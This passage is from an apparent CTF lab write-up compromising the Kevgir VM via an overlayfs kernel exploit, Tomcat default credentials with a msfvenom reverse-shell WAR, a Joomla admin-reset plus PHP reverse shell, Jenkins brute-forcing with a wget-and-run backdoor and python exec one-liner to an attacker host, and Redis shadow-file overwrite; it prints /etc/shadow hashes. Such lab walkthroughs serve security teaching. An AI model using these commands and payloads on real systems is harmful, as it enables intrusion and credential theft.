</span><span class='line'>Linux Kernel 3.13.0 &lt; 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Local Root Shell                                                   <span class="p">|</span> ./linux/local/37292.c
</span><span class='line'>Linux Kernel 3.13.0 &lt; 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Privilege Escalation <span class="o">(</span>Access /etc/shadow<span class="o">)</span>                          <span class="p">|</span> ./linux/local/37293.txt
</span><span class='line'>NetKit FTP Client <span class="o">(</span>Ubuntu 14.04<span class="o">)</span> - Crash/DoS PoC                                                                                           <span class="p">|</span> ./linux/dos/37777.txt
</span><span class='line'>Linux Kernel &lt;<span class="o">=</span> 4.3.3 <span class="o">(</span>Ubuntu 14.04/15.10<span class="o">)</span> - overlayfs Local Root Exploit                                                                  <span class="p">|</span> ./linux/local/39166.c
</span><span class='line'>Linux Kernel <span class="o">(</span>Ubuntu 14.04.3<span class="o">)</span> - perf_event_open<span class="o">()</span> Can Race with execve<span class="o">()</span> <span class="o">(</span>/etc/shadow<span class="o">)</span>                                                     <span class="p">|</span> ./linux/dos/39771.txt
</span><span class='line'>------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
</span></code></pre></td></tr></table></div></figure>


<p>After several attempts and found the exploit <code>overlayfs local root exploit (39166.c)</code> is able to work.</p>

<p>So the next step is to upload the exploit file <code>39166.c</code> and <code>gcc</code> compile it to executable file, and run it for rooting!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>gcc 39166.c -o 39166
</span><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>./39166
</span><span class='line'>root@canyoupwnme:/tmp# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>admin<span class="o">)</span>
</span><span class='line'>root@canyoupwnme:/tmp# <span class="nb">pwd</span>
</span><span class='line'>/tmp
</span><span class='line'>root@canyoupwnme:/tmp# cat /etc/shadow
</span><span class='line'>root:<span class="nv">$6$6ZcgUVCV$Ocsce9FUHYswcbI3UtrPNqFnkvcPOnEtstWlVSTqGYEYAYZ9aYw7tnW35uRGxb1z7ZZBZ</span>.hoQcm/S/cg0f4uI0:16843:0:99999:7:::
</span><span class='line'>daemon:*:16652:0:99999:7:::
</span><span class='line'>bin:*:16652:0:99999:7:::
</span><span class='line'>sys:*:16652:0:99999:7:::
</span><span class='line'>sync:*:16652:0:99999:7:::
</span><span class='line'>games:*:16652:0:99999:7:::
</span><span class='line'>man:*:16652:0:99999:7:::
</span><span class='line'>lp:*:16652:0:99999:7:::
</span><span class='line'>mail:*:16652:0:99999:7:::
</span><span class='line'>news:*:16652:0:99999:7:::
</span><span class='line'>uucp:*:16652:0:99999:7:::
</span><span class='line'>proxy:*:16652:0:99999:7:::
</span><span class='line'>www-data:*:16652:0:99999:7:::
</span><span class='line'>backup:*:16652:0:99999:7:::
</span><span class='line'>list:*:16652:0:99999:7:::
</span><span class='line'>irc:*:16652:0:99999:7:::
</span><span class='line'>gnats:*:16652:0:99999:7:::
</span><span class='line'>nobody:*:16652:0:99999:7:::
</span><span class='line'>libuuid:!:16652:0:99999:7:::
</span><span class='line'>syslog:*:16652:0:99999:7:::
</span><span class='line'>mysql:!:16834:0:99999:7:::
</span><span class='line'>messagebus:*:16834:0:99999:7:::
</span><span class='line'>landscape:*:16834:0:99999:7:::
</span><span class='line'>sshd:*:16834:0:99999:7:::
</span><span class='line'>tomcat7:*:16834:0:99999:7:::
</span><span class='line'>user:<span class="nv">$6$a9pCcsxn$5xvkibMZh9RDRVuAeC6vJSR2x17t52pYtdd50</span>/rh3TY.ZoE53GE.OcbtVdBMRKROLko.qbIqj88k5mOXjtE3q.:16834:0:99999:7:::
</span><span class='line'>ftp:*:16834:0:99999:7:::
</span><span class='line'>admin:<span class="nv">$6$mf3G6MUz$/</span>si.Yp0SgJH/D4WQRC2lyRAaFKUqeHzC3ZbL7ENrCR2lCNibr0d8V0y03JFEnymP8MZzBi3m6mvaeeUmyySve/:16834:0:99999:7:::
</span><span class='line'>statd:*:16839:0:99999:7:::
</span><span class='line'>jenkins:*:16840:0:99999:7:::
</span><span class='line'>root@canyoupwnme:/tmp#
</span></code></pre></td></tr></table></div></figure>


<p>Well done!</p>

<h3>Vector 2: Tomcat default account login and file upload vulnerability</h3>

<p>From the nikto result of port 8080, I found this is a tomcat server which the default username/password is still available: <font color="red"><code>tomcat/tomcat</code></font>.</p>

<p>Then, accessing to management page <code>http://10.1.1.128:8080/manager/html/</code> and login with default username/password</p>

<p>After login succeed, use <code>msfvenom</code> to create a reverse_shell WAR exploit.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; sh4444.war
</span><span class='line'>Payload size: <span class="m">1088</span> bytes
</span></code></pre></td></tr></table></div></figure>


<p>and then upload/deploy exploit WAR file.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Kevgir/1.png"></p>

<p>Then setup <code>nc</code> to listen on local port <code>4444</code>, and access exploit URL <code>http://10.1.1.128:8080/sh4444/</code> to run the exploit.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43783
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>106<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/var/lib/tomcat7
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root    root    <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 .
</span><span class='line'>drwxr-xr-x <span class="m">50</span> root    root    <span class="m">4096</span> Feb <span class="m">15</span> 06:40 ..
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 common
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">12</span> Jun <span class="m">20</span>  <span class="m">2015</span> conf -&gt; /etc/tomcat7
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">17</span> Jun <span class="m">20</span>  <span class="m">2015</span> logs -&gt; ../../log/tomcat7
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 server
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 shared
</span><span class='line'>drwxrwxr-x  <span class="m">6</span> tomcat7 tomcat7 <span class="m">4096</span> May <span class="m">24</span> 12:40 webapps
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">19</span> Jun <span class="m">20</span>  <span class="m">2015</span> work -&gt; ../../cache/tomcat7
</span></code></pre></td></tr></table></div></figure>


<p>Now we are in~</p>

<p>or you can use <code>metasploit (msfconsole)</code> to do this job automatically by using the exploit: <font color="red"><code>exploit/multi/http/tomcat_mgr_upload</code></font>.</p>

<h3>Vector 3: Joomla v1.5 admin password bypass attack</h3>

<p>From the nmap scan result, we know <code>Joomla v1.5</code> is running on target machine&rsquo;s port <code>8081</code>.</p>

<p>Run <code>joomscan</code> to check if any known vulnerability exists, found the joomla version is <code>1.5.1</code> and there is a Remote Admin Password Change Vulnerability.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncate...
</span><span class='line'>
</span><span class='line'><span class="c">## Fingerprinting in progress ...</span>
</span><span class='line'>
</span><span class='line'>Use of uninitialized value in pattern match <span class="o">(</span>m//<span class="o">)</span> at ./joomscan.pl line 1009.
</span><span class='line'>~Generic version family ....... <span class="o">[</span>1.5.x<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>~1.5.x htaccess.txt revealed <span class="o">[</span>1.5.1 - 1.5.3<span class="o">]</span>
</span><span class='line'>~1.5.x configuration.php-dist revealed <span class="o">[</span>1.5.1 - 1.5.8<span class="o">]</span>
</span><span class='line'>~1.5.x en-GB.xml revealed <span class="o">[</span>1.5.0 - 1.5.1<span class="o">]</span>
</span><span class='line'>~1.5.x en-GB.ini revealed 1.5.1
</span><span class='line'>~1.5.x admin en-GB.com_config.ini revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> -1.5.1<span class="o">]</span>
</span><span class='line'>~1.5.x admin en-GB.ini revealed 1.5.1
</span><span class='line'>~1.5.x adminlists.html revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> - 1.5.6<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>* The Exact version found is 1.5.1
</span><span class='line'>
</span><span class='line'><span class="c">## Fingerprinting done.</span>
</span><span class='line'>
</span><span class='line'>...truncate...
</span><span class='line'>
</span><span class='line'>...truncate...
</span><span class='line'>
</span><span class='line'><span class="c"># 15</span>
</span><span class='line'>Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability
</span><span class='line'>Versions Affected: 1.5.5 &lt;<span class="o">=</span>
</span><span class='line'>Check: /components/com_user/controller.php
</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option<span class="o">=</span>com_user<span class="p">&amp;</span><span class="nv">view</span><span class="o">=</span>reset<span class="p">&amp;</span><span class="nv">layout</span><span class="o">=</span>confirm  2. Write into field <span class="s2">&quot;token&quot;</span> char <span class="err">&#39;</span> and Click OK.  3. Write new password <span class="k">for</span> admin  4. Go to url : target.com/administrator/  5. Login admin with new password
</span><span class='line'>Vulnerable? Yes
</span><span class='line'>
</span><span class='line'>...truncate...
</span></code></pre></td></tr></table></div></figure>


<p>Followed the instruction and change the Joomla admin password to <font color="red"><code>test</code></font>, and then login to the administrator page.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Kevgir/2.png"></p>

<p>Then choose <code>Extensions</code> &ndash;> <code>Template Manager</code> &ndash;> <code>beez</code> (any template will do the job) &ndash;> <code>Edit HTML</code></p>

<p>Then clear all the exist content and paste your PHP exploit code here (in this case, I am using <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">Pentest Monkey</a> one.).</p>

<p>Then save and apply.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Kevgir/3.png"></p>

<p>Finally, setup <code>nc</code> to listen on port <code>4444</code> and preview the page to trigger the exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# nc -lvnp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43800
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 14:02:50 up <span class="m">1</span> day,  1:06,  <span class="m">1</span> user,  load average: 0.16, 0.07, 0.06
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>admin    pts/0    10.1.1.130       Mon15    1:33m  0.20s  0.06s sshd: admin <span class="o">[</span>priv<span class="o">]</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span></code></pre></td></tr></table></div></figure>


<h3>Vector 4: Jenkins login bruteforce attack</h3>

<p>Due to Jenkins is vulnerable to brute force attacking&hellip;</p>

<p>so use MSF to brute force attack the jenkins server with common dictionary</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>auxiliary/scanner/http/jenkins_login<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                   Required  Description
</span><span class='line'>   ----              ---------------                                   --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   <span class="nb">false                                             </span>no        Try blank passwords <span class="k">for</span> all users
</span><span class='line'>   BRUTEFORCE_SPEED  <span class="m">5</span>                                                 yes       How fast to bruteforce, from <span class="m">0</span> to 5
</span><span class='line'>   DB_ALL_CREDS      <span class="nb">false                                             </span>no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       <span class="nb">false                                             </span>no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      <span class="nb">false                                             </span>no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                              yes       The HTTP method to use <span class="k">for</span> the login <span class="o">(</span>Accepted: GET, POST<span class="o">)</span>
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                           yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                            no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /root/tools/SecLists/Passwords/john.txt           no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                             no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
</span><span class='line'>   RHOSTS            10.1.1.128                                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             <span class="m">9000</span>                                              yes       The target port
</span><span class='line'>   STOP_ON_SUCCESS   <span class="nb">false                                             </span>yes       Stop guessing when a credential works <span class="k">for</span> a host
</span><span class='line'>   THREADS           <span class="m">10</span>                                                yes       The number of concurrent threads
</span><span class='line'>   USERNAME                                                            no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                       no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      <span class="nb">false                                             </span>no        Try the username as the password <span class="k">for</span> all users
</span><span class='line'>   USER_FILE         /root/tools/SecLists/Usernames/top_shortlist.txt  no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           <span class="nb">true                                              </span>yes       Whether to print output <span class="k">for</span> all attempts
</span><span class='line'>   VHOST                                                               no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; <span class="nb">set </span>verbose <span class="nb">false</span>
</span><span class='line'><span class="nv">verbose</span> <span class="o">=</span>&gt; <span class="nb">false</span>
</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> 10.1.1.128:9000 - LOGIN SUCCESSFUL: admin:hello
</span><span class='line'>^C<span class="o">[</span>*<span class="o">]</span> Caught interrupt from the console...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure>


<p>Bingo! user login found: <font color="red"><code>admin/hello</code></font>.</p>

<p>Now let&rsquo;s login to jenkins managing page, and following to this <a href="http://dan.thoeisen.dk/hjem/lets-hack-a-jenkins-server/" title="Jenkins attacking tutorial">tutorial</a> to run commands.</p>

<p>Go to <code>Manage Jenkins</code> and then <code>Script Console</code>, input and run the following script code to check if command can be run on the target server.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Kevgir/4.png"></p>

<p>Next, run <code>msfconsole</code> and use payload <code>exploit/multi/script/web_delivery</code> to create python backdoor and setup evil web server on local port <code>8080</code> in order to upload the backdoor.</p>

<p>After evil web server has been established, we input the following code in the script console.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>def <span class="nv">process</span> <span class="o">=</span> <span class="s2">&quot;wget http://10.1.1.130:8080/z7UgcWwtF -O /tmp/bdsh4444&quot;</span>.execute<span class="o">()</span>
</span><span class='line'>def <span class="nv">process3</span> <span class="o">=</span> <span class="s2">&quot;python /tmp/bdsh4444&quot;</span>.execute<span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/multi/script/web_delivery<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The <span class="nb">local </span>host to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0
</span><span class='line'>   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local </span>port to listen on.
</span><span class='line'>   SSL      <span class="nb">false            </span>no        Negotiate SSL <span class="k">for</span> incoming connections
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
</span><span class='line'>   URIPATH                   no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>python/meterpreter/reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  10.1.1.130       yes       The listen address
</span><span class='line'>   LPORT  <span class="m">4444</span>             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Python
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; exploit
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.1.1.130:4444
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Using URL: http://0.0.0.0:8080/z7UgcWwtF
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Local IP: http://10.1.1.130:8080/z7UgcWwtF
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Server started.
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Run the following <span class="nb">command </span>on the target machine:
</span><span class='line'>python -c <span class="s2">&quot;import urllib2; r = urllib2.urlopen(&#39;http://10.1.1.130:8080/z7UgcWwtF&#39;); exec(r.read());&quot;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.128       web_delivery - Delivering Payload
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">37475</span> bytes<span class="o">)</span> to 10.1.1.128
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.128:36457<span class="o">)</span> at 2016-05-26 07:41:18 -0400
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt;
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; sessions -i 1
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer     : canyoupwnme
</span><span class='line'>OS           : Linux 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015</span>
</span><span class='line'>Architecture : i686
</span><span class='line'>Meterpreter  : python/python
</span><span class='line'>meterpreter &gt; ifconfig
</span></code></pre></td></tr></table></div></figure>


<p>Now Jenkins has been compromised~~</p>

<h3>Vector 5: Redis file upload attack</h3>

<p>Create a shadow file to overwrite target machine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncate...
</span><span class='line'>debian-tor:*:16661:0:99999:7:::
</span><span class='line'>admin:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
</span><span class='line'>user:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
</span><span class='line'>F4l13n:<span class="nv">$6$dZlaWry7$JLdKZhM8F9jH7b4Nr86fOZHVd</span>.1RTQ3VoqCCAP3iEv0rSJL8HVZ0saN89l/MdWjmbQ8Mskx2Q4g1u1kfu4AZI/:16661:0:99999:7:::
</span><span class='line'>ftpuser:!:16679:0:99999:7:::
</span><span class='line'>...truncate...
</span></code></pre></td></tr></table></div></figure>


<p>Use metasploit payload to upload our shadow file to overwrite target machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Module options <span class="o">(</span>auxiliary/scanner/redis/file_upload<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name                    Current Setting        Required  Description
</span><span class='line'>   ----                    ---------------        --------  -----------
</span><span class='line'>   DISABLE_RDBCOMPRESSION  <span class="nb">true                   </span>yes       Disable compression when saving <span class="k">if</span> found to be enabled
</span><span class='line'>   LocalFile               /var/www/html/shadow_  no        Local file to be uploaded
